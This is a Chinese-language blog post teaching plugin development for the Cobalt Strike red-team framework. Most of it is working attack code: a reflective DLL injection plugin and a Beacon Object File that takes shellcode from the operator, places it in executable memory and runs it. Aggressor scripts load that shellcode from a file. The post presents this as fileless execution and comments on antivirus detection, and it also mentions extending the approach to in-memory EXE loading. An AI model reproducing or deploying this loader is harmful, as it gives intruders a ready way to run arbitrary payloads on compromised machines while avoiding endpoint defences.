<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>轻松学会cobalt strike插件开发 - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="轻松学会cobalt strike插件开发" />
<meta property="og:description" content="Cobalt Strike简介 Cobalt Strike是一款美国RedTeam开发的渗透测试神器，常被业界人称为CS也被称为CS神器，在内网渗透中使用的频率较高。最近这个工具大火，成为了渗透测试中不可缺少的利器。其拥有多种协议主机上线方式，集成了提权，凭据导出，端口转发，socket代理，office攻击，文件捆绑，钓鱼等功能，是一款基于Java的渗透测试神器。
Cobalt Strike常用命令如下：
help: 查看可用命令。getuid: 获取当前用户的权限。getsystem: 获取system权限。getprivs: 获取当前beacon里面的所有权限（这个用户现在能干嘛）。net domain_trusts: 列出域之间的信任关系。net logons:查看现在在登录的用户。net share:查看共享。shell xxx: 在命令行中执行xxx命令。powerpick xxx:不通过powershell来执行命令 插件开发 直接步入主题，先讲cs的插件开发RDI（ReflectiveDLLInject）,cs提供bdllspawn方法来来反射dll执行代码。同时官方也提供了相关的使用文档和demo示例。Functions
我们直接下载提供的vs模版项目https://codeload.github.com/stephenfewer/ReflectiveDLLInjection/zip/refs/heads/master
之后就很简单了，vs打开项目直接编辑ReflectiveDll.c进行代码编写，我们这里接收命令行参数来进行弹窗打印
//===============================================================================================//
// This is a stub for the actuall functionality of the DLL.
//===============================================================================================//
#include &#34;ReflectiveLoader.h&#34;
#include &lt;string&gt;
#include &lt;shellapi.h&gt;
#pragma comment(lib, &#34;Shell32.lib&#34;)
using namespace std;
std::string szargs;
std::wstring wszargs;
std::wstring wsHostFile;
int argc = 0;
LPWSTR* argv = NULL;
extern HINSTANCE hAppInstance;
wstring StringToWString(const string&amp; str)" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/1e0b908fc7eaa4ef44ac7ad1be0341e5/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-11-18T10:06:35+08:00" />
<meta property="article:modified_time" content="2023-11-18T10:06:35+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">轻松学会cobalt strike插件开发</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <h2>Cobalt Strike简介</h2> 
<p>Cobalt Strike是一款美国RedTeam开发的渗透测试神器，常被业界人称为CS也被称为CS神器，在内网渗透中使用的频率较高。最近这个工具大火，成为了渗透测试中不可缺少的利器。其拥有多种协议主机上线方式，集成了提权，凭据导出，端口转发，socket代理，office攻击，文件捆绑，钓鱼等功能，是一款基于Java的渗透测试神器。</p> 
<p>Cobalt Strike常用命令如下：</p> 
<ol><li>help: 查看可用命令。</li><li>getuid: 获取当前用户的权限。</li><li>getsystem: 获取system权限。</li><li>getprivs: 获取当前beacon里面的所有权限（这个用户现在能干嘛）。</li><li>net domain_trusts: 列出域之间的信任关系。</li><li>net logons:查看现在在登录的用户。</li><li>net share:查看共享。</li><li>shell xxx: 在命令行中执行xxx命令。</li><li>powerpick xxx:不通过powershell来执行命令</li></ol> 
<h2>插件开发</h2> 
<p>直接步入主题，先讲cs的插件开发RDI（ReflectiveDLLInject）,cs提供bdllspawn方法来来反射dll执行代码。同时官方也提供了相关的使用文档和demo示例。<a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#bdllspawn" rel="nofollow" title="Functions">Functions</a></p> 
<p></p> 
<p class="img-center"><img alt="" height="1188" src="https://images2.imgbox.com/cf/61/hUhIVpEf_o.png" width="1200"></p> 
<p>我们直接下载提供的vs模版项目<a href="https://codeload.github.com/stephenfewer/ReflectiveDLLInjection/zip/refs/heads/master" rel="nofollow" title="https://codeload.github.com/stephenfewer/ReflectiveDLLInjection/zip/refs/heads/master">https://codeload.github.com/stephenfewer/ReflectiveDLLInjection/zip/refs/heads/master</a></p> 
<p>之后就很简单了，vs打开项目直接编辑ReflectiveDll.c进行代码编写，我们这里接收命令行参数来进行弹窗打印</p> 
<p>//===============================================================================================//</p> 
<p>// This is a stub for the actuall functionality of the DLL.</p> 
<p>//===============================================================================================//</p> 
<p>#include "ReflectiveLoader.h"</p> 
<p>#include &lt;string&gt;</p> 
<p>#include &lt;shellapi.h&gt;</p> 
<p>#pragma comment(lib, "Shell32.lib")</p> 
<p>using namespace std;</p> 
<p>std::string szargs;</p> 
<p>std::wstring wszargs;</p> 
<p>std::wstring wsHostFile;</p> 
<p>int argc = 0;</p> 
<p>LPWSTR* argv = NULL;</p> 
<p>extern HINSTANCE hAppInstance;</p> 
<p>wstring StringToWString(const string&amp; str)</p> 
<p>{<!-- --></p> 
<p>int length;</p> 
<p>length = MultiByteToWideChar(CP_ACP, 0, str.c_str(), -1, NULL, 0);</p> 
<p>wchar_t* wide_char = new wchar_t[length];</p> 
<p>MultiByteToWideChar(CP_ACP, 0, str.c_str(), -1, wide_char, length);</p> 
<p>wstring wstr(wide_char);</p> 
<p>delete[] wide_char;</p> 
<p>return wstr;</p> 
<p>}</p> 
<p></p> 
<p>BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )</p> 
<p>{<!-- --></p> 
<p>BOOL bReturnValue = TRUE;</p> 
<p>switch( dwReason )</p> 
<p>{<!-- --></p> 
<p>case DLL_QUERY_HMODULE:</p> 
<p>if( lpReserved != NULL )</p> 
<p>*(HMODULE *)lpReserved = hAppInstance;</p> 
<p>break;</p> 
<p>case DLL_PROCESS_ATTACH:</p> 
<p>hAppInstance = hinstDLL;</p> 
<p>printf("C++ ReflectiveDLL\n");</p> 
<p>if (lpReserved != NULL) {<!-- --></p> 
<p>szargs = (PCHAR)lpReserved;</p> 
<p>wszargs = StringToWString(szargs);</p> 
<p>argv = CommandLineToArgvW(wszargs.data(), &amp;argc);</p> 
<p>}</p> 
<p>MessageBox(NULL, argv[1], L"测试", MB_OK);</p> 
<p></p> 
<p>fflush(stdout);</p> 
<p>ExitProcess(0);</p> 
<p>break;</p> 
<p>case DLL_PROCESS_DETACH:</p> 
<p>case DLL_THREAD_ATTACH:</p> 
<p>case DLL_THREAD_DETACH:</p> 
<p>break;</p> 
<p>}</p> 
<p>return bReturnValue;</p> 
<p>}</p> 
<p>写完之后编译dll，还需要使用bdllspawn来调用，redll.dll就是我们编写的dll名字，$args = substr($0, 2);为我们传入的参数</p> 
<p>alias redll {<!-- --></p> 
<p>$args = substr($0, 2);</p> 
<p>bdllspawn($1, script_resource("redll.dll"),$args, "dll", 5000, false);</p> 
<p>}</p> 
<p></p> 
<p class="img-center"><img alt="" height="55" src="https://images2.imgbox.com/9d/f3/vDfbc50p_o.png" width="1200"></p> 
<p>直接导入编写好的插件执行</p> 
<p></p> 
<p class="img-center"><img alt="" height="772" src="https://images2.imgbox.com/70/66/ikWyDMrb_o.png" width="1200"></p> 
<p>被提示远程线程注入了，原生cs的行为特征可能会触发杀软的主动防御，我们点允许就执行成功了，实现了无文件落地的执行dll功能。代表插件有Ladon。</p> 
<p></p> 
<p class="img-center"><img alt="" height="823" src="https://images2.imgbox.com/6f/52/etsBjLGs_o.png" width="1200"></p> 
<p>想要RDI不被拦截我们可能需要更加深入的研究cs的代码机制，进行修改，但是这样就会变的更加繁琐。所以CS还有一个插件方法，BOF(Beacon Object File)</p> 
<p></p> 
<h2>BOF介绍</h2> 
<p>的支持是在CobaltStrike4.1版本中新引入的功能。BOF文件是由c代码编译而来的可在Beacon进程中动态加载执行的二进制程序。无文件执行与无新进程创建的特性更加符合OPSEC的原则，适用于严苛的终端对抗场景。低开发门槛与便利的内部Beacon API调用与使得BOF特别适合后渗透阶段攻击工具的快速开发与移植。</p> 
<p></p> 
<p>跟RDI一样关于BOF，CS也提供了相关的文档进行解释和开发介绍</p> 
<p><a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_bof-c-api.htm" rel="nofollow" title="BOF C API">BOF C API</a></p> 
<p></p> 
<p class="img-center"><img alt="" height="1200" src="https://images2.imgbox.com/34/94/igR9G97H_o.png" width="1200"></p> 
<p>看不懂英文的兄弟请直接翻译，我这边讲的开发内容非常基础，想要更加深入的开发还是直接对照API文档来进行探索。</p> 
<p>回到主题，BOF开发CS同样提供了相应的开发模版，我们只需要下载项目<a href="https://codeload.github.com/Cobalt-Strike/bof-vs" rel="nofollow" title="https://codeload.github.com/Cobalt-Strike/bof-vs">https://codeload.github.com/Cobalt-Strike/bof-vs</a></p> 
<p>下载的压缩包需要解压到 C:\Users\你的用户名\Documents\Visual Studio 2022\Templates\ProjectTemplates</p> 
<p>然后重启vs，新建BOF项目</p> 
<p></p> 
<p class="img-center"><img alt="" height="970" src="https://images2.imgbox.com/88/93/JQ4bgdJe_o.png" width="1200"></p> 
<p>然后就可以在bof.cpp进行代码编辑啦</p> 
<p>#include &lt;Windows.h&gt;</p> 
<p>#include "base\helpers.h"</p> 
<p></p> 
<p></p> 
<p>#ifdef _DEBUG</p> 
<p>#include "base\mock.h"</p> 
<p>#undef DECLSPEC_IMPORT</p> 
<p>#define DECLSPEC_IMPORT</p> 
<p>#endif</p> 
<p></p> 
<p>extern "C" {<!-- --></p> 
<p>#include "beacon.h"</p> 
<p></p> 
<p>DFR(KERNEL32, GetLastError);</p> 
<p>#define GetLastError KERNEL32$GetLastError</p> 
<p></p> 
<p>void go(char* args, int len) {<!-- --></p> 
<p></p> 
<p>DFR_LOCAL(KERNEL32, GetSystemDirectoryA);</p> 
<p>DFR_LOCAL(KERNEL32, CloseHandle);</p> 
<p>DFR_LOCAL(KERNEL32, CreateMutexA);</p> 
<p>DFR_LOCAL(KERNEL32, CreateProcessA);</p> 
<p>DFR_LOCAL(KERNEL32, GetProcAddress);</p> 
<p>DFR_LOCAL(KERNEL32, VirtualAlloc);</p> 
<p>DFR_LOCAL(KERNEL32, VirtualFree);</p> 
<p>DFR_LOCAL(KERNEL32, LoadLibraryA);</p> 
<p>DFR_LOCAL(KERNEL32, ReleaseMutex);</p> 
<p>DFR_LOCAL(KERNEL32, CreateFileA);</p> 
<p>DFR_LOCAL(KERNEL32, GetFileSize);</p> 
<p>DFR_LOCAL(KERNEL32, ReadFile);</p> 
<p>DFR_LOCAL(KERNEL32, VirtualProtect);</p> 
<p>char* sc_ptr;</p> 
<p>SIZE_T sc_len;</p> 
<p>DWORD pid;</p> 
<p>datap parser;</p> 
<p>BeaconDataParse(&amp;parser, args, len);</p> 
<p>sc_ptr = BeaconDataExtract(&amp;parser, NULL);</p> 
<p>DWORD dataSize = BeaconDataLength(&amp;parser);</p> 
<p>DWORD shellCodeLength = dataSize - (sc_ptr - parser.buffer);</p> 
<p>if (sc_ptr == NULL) {<!-- --></p> 
<p>BeaconPrintf(CALLBACK_ERROR, "Error: Failed to sc_ptr\n");</p> 
<p></p> 
<p>return;</p> 
<p>}</p> 
<p></p> 
<p>LPVOID pMemory = VirtualAlloc(NULL, 900000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</p> 
<p>if (pMemory == NULL) {<!-- --></p> 
<p>BeaconPrintf(CALLBACK_ERROR, "Error: Failed top Memory\n");</p> 
<p>return;</p> 
<p>}</p> 
<p></p> 
<p>DWORD old = 0;</p> 
<p>if (!VirtualProtect(pMemory, 900000, PAGE_EXECUTE_READWRITE, &amp;old)) {<!-- --></p> 
<p>BeaconPrintf(CALLBACK_ERROR, "Error: Failed to old\n");</p> 
<p>return;</p> 
<p>}</p> 
<p></p> 
<p>for (int i = 0; i &lt; shellCodeLength; ++i) {<!-- --></p> 
<p>reinterpret_cast&lt;unsigned char*&gt;(pMemory)[i] = sc_ptr[i];</p> 
<p>}</p> 
<p></p> 
<p>typedef void(*SHELLCODE)();</p> 
<p>SHELLCODE sc = reinterpret_cast&lt;SHELLCODE&gt;(pMemory);</p> 
<p>sc();</p> 
<p>VirtualFree(pMemory, NULL, MEM_RELEASE);</p> 
<p></p> 
<p>}</p> 
<p>}</p> 
<p></p> 
<p></p> 
<p>#if defined(_DEBUG) &amp;&amp; !defined(_GTEST)</p> 
<p></p> 
<p>int main(int argc, char* argv[]) {<!-- --></p> 
<p>bof::runMocked&lt;&gt;(go);</p> 
<p>return 0;</p> 
<p>}</p> 
<p></p> 
<p>// Define unit tests</p> 
<p>#elif defined(_GTEST)</p> 
<p>#include &lt;gtest\gtest.h&gt;</p> 
<p></p> 
<p>TEST(BofTest, Test1) {<!-- --></p> 
<p>std::vector&lt;bof::output::OutputEntry&gt; got =</p> 
<p>bof::runMocked&lt;&gt;(go);</p> 
<p>std::vector&lt;bof::output::OutputEntry&gt; expected = {<!-- --></p> 
<p>{CALLBACK_OUTPUT, "System Directory: C:\\Windows\\system32"}</p> 
<p>};</p> 
<p>ASSERT_EQ(expected.size(), got.size());</p> 
<p>ASSERT_STRCASEEQ(expected[0].output.c_str(), got[0].output.c_str());</p> 
<p>}</p> 
<p>#endif</p> 
<p>我们需要对我们使用的函数按照他给出的模版进行导入，就像下面的示例一样</p> 
<p>DFR_LOCAL(KERNEL32, GetSystemDirectoryA);</p> 
<p>DFR_LOCAL(KERNEL32, VirtualAlloc);</p> 
<p>DFR_LOCAL(KERNEL32, VirtualFree);</p> 
<p>DFR_LOCAL(KERNEL32, VirtualProtect);</p> 
<p>上面的示例代码是从CS控制台接收shellcode，进行动态执行。用到了几个BOF c API</p> 
<p>BeaconDataParse(&amp;parser, args, len); //准备一个数据分析器以从指定的缓冲区中提取参数。</p> 
<p>sc_ptr = BeaconDataExtract(&amp;parser, NULL);//接收参数</p> 
<p>DWORD dataSize = BeaconDataLength(&amp;parser);//这边是计算data数据大小，我们用来计算shellcode</p> 
<p>BeaconPrintf(CALLBACK_ERROR, "Error: Failed to old\n");//打印到CS控制台</p> 
<p>然后其他代码就是正常的shellcode加载代码，光这样我们是无法直接从cs控制台获取shellcode的，所以我们还需要一个插件来读取指定文件的shellcode。</p> 
<p>alias run12 {<!-- --></p> 
<p>local('$handle $data $args $sc_data');</p> 
<p>$barch = barch($1);</p> 
<p>$handle = openf(script_resource("bof.obj"));</p> 
<p>$data = readb($handle, -1);</p> 
<p>closef($handle);</p> 
<p>$sc_handle = openf($2);//读取文件数据</p> 
<p>$sc_data = readb($sc_handle, -1);</p> 
<p>closef($sc_handle);</p> 
<p>$args = bof_pack($1, "b",$sc_data);</p> 
<p>beacon_inline_execute($1, $data, "go", $args);</p> 
<p>}</p> 
<p></p> 
<p></p> 
<p>这边我们用到了bof_pack，相关文档如下</p> 
<p><a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#bof_pack" rel="nofollow" title="Functions">Functions</a></p> 
<p>还有﻿beacon_inline_execute</p> 
<p><a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_with-aggressor-script.htm?Highlight=beacon_inline_execute" rel="nofollow" title="Aggressor Script and BOFs">Aggressor Script and BOFs</a></p> 
<p>$sc_handle = openf($2);//读取文件数据</p> 
<p>$sc_data = readb($sc_handle, -1);</p> 
<p>closef($sc_handle);</p> 
<p>从cs命令行把读取到的文件内容传递给$sc_data，这边传递的为shellcode</p> 
<p>$args = bof_pack($1, "b",$sc_data);</p> 
<p>beacon_inline_execute($1, $data, "go", $args);</p> 
<p>把shellcode传入到我们的obj项目的go方法也就是inline_execute</p> 
<p>写完之后我们把项目编译成obj，cna脚本加载到我们的cs</p> 
<p><br> ﻿</p> 
<p class="img-center"><img alt="" height="1059" src="https://images2.imgbox.com/b4/bd/pabL0pfV_o.png" width="1200"></p> 
<p>然后我们cs控制台执行</p> 
<p></p> 
<p class="img-center"><img alt="" height="964" src="https://images2.imgbox.com/67/f5/3gIKSWp4_o.png" width="1200"></p> 
<p>shellcode不落地执行成功，以此延伸PEloader。直接内存不落地加载EXE文件</p> 
<p></p> 
<p class="img-center"><img alt="" height="1074" src="https://images2.imgbox.com/77/b5/XJ7A3W56_o.png" width="1200"></p> 
<p>但是有一个坑点就是，如果我们执行的exe大于10M就会引发报错，我们需要在profile中设置tasks_max_size的值</p> 
<p>参考文档：<a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_profile-language.htm#_Toc65482842" rel="nofollow" title="Profile Language">Profile Language</a></p> 
<p></p> 
<p class="img-center"><img alt="" height="1200" src="https://images2.imgbox.com/98/8b/RYonht07_o.png" width="1200"></p> 
<p></p> 
<p>以上就是CS插件开发的基础知识，讲的不清楚的地方请自行查阅官方文档，每一步的文档我都标注出来了</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/b7b4e8f13e731c9c49842e9f4458cd4f/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">Redis学习笔记17：基于spring data redis及lua脚本批处理scan指令查询永久有效的key</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/54bc61e442658480163fce84d95f65f1/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">springboot项目yml文件中使用${}配置</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>